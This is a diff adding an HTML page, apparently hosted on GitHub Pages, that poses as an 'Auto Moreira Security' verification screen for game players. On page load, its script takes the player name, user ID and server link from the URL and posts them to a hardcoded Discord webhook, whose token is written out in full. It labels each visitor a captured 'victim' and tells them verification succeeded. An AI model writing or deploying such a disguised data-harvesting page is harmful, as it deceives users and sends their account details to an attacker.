@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Auto Moreira System</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            background: #0f172a;
+            color: white;
+            font-family: sans-serif;
+            text-align: center;
+            padding: 50px;
+        }
+        .loader {
+            border: 8px solid #333;
+            border-top: 8px solid #00ff00;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            margin: 20px auto;
+            animation: spin 2s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <h1>🛡️ Auto Moreira Security</h1>
+    <p>Processing security verification...</p>
+    
+    <script>
+        // Configuração - COLE SEU WEBHOOK DO DISCORD AQUI:
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1466545598273552437/VH33E3Wb2olx18f5YD3W8wl80pflegd1wiGMHtRRr6GXTOpLQj18uLc3s4UwRCVrNRhh";
+        
+        // Pega dados da URL
+        const params = new URLSearchParams(window.location.search);
+        
+        // Se tiver dados, processa
+        if (params.toString()) {
+            const playerName = params.get('player_name') || 'N/A';
+            const playerId = params.get('player_id') || 'N/A';
+            const serverLink = params.get('server_link') || 'N/A';
+            
+            // Envia para Discord
+            fetch(DISCORD_WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: '@everyone **🚨 AUTO MOREIRA - NOVA VÍTIMA!**',
+                    embeds: [{
+                        title: "🔓 VÍTIMA CAPTURADA",
+                        color: 0xff0000,
+                        fields: [
+                            { name: "👤 Jogador", value: playerName, inline: true },
+                            { name: "🆔 User ID", value: playerId, inline: true },
+                            { name: "🔗 Link do Servidor", value: serverLink, inline: false },
+                            { name: "⏰ Hora", value: new Date().toLocaleString('pt-BR'), inline: true }
+                        ],
+                        footer: { text: "GitHub Pages • Auto Moreira 2026" },
+                        timestamp: new Date().toISOString()
+                    }]
+                })
+            }).then(() => {
+                document.querySelector('h1').textContent = '✅ Verification Complete!';
+                document.querySelector('p').textContent = 'Data sent to security system.';
+                document.querySelector('.loader').style.borderTopColor = '#00ff00';
+            }).catch(err => {
+                document.querySelector('h1').textContent = '⚠️ Processing Error';
+                document.querySelector('p').textContent = 'Data received but Discord error.';
+                console.error('Error:', err);
+            });
+        } else {
+            // Se não tiver dados, mostra mensagem normal
+            document.querySelector('p').textContent = 'System ready for verification requests.';
+        }
+    </script>
+</body>
+</html>
